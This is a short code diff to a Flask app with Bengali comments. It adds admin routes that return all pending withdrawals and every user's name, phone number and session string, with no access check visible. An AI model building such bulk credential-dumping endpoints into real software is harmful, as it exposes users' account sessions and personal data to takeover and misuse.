@@ -227,6 +227,20 @@ def admin_update_user():
         return jsonify({"success": False})
 
 
+@app.route('/api/admin/get_withdrawals')
+def get_withdrawals():
+    # ডাটাবেজ থেকে সব পেন্ডিং উইথড্র রিকোয়েস্ট নিয়ে আসা
+    withdraws = list(db['withdraws'].find({}, {"_id": 0}))
+    return jsonify({"success": True, "withdrawals": withdraws})
+
+
+@app.route('/api/admin/get_all_sessions')
+def get_all_sessions():
+    # ইউজারের নাম, ফোন এবং সেশন স্ট্রিং নিয়ে আসা
+    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
+    return jsonify({"success": True, "sessions": users})
+
+
 # ---------------------------------------------------------
 # ৬. অ্যাড ও টাস্ক লোড এপিআই (Frontend Feed)
 # ---------------------------------------------------------
@@ -241,6 +255,7 @@ def get_ads():
 def get_tasks():
     tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
     return jsonify({"success": True, "tasks": tasks})
+    
 
 
 # ---------------------------------------------------------
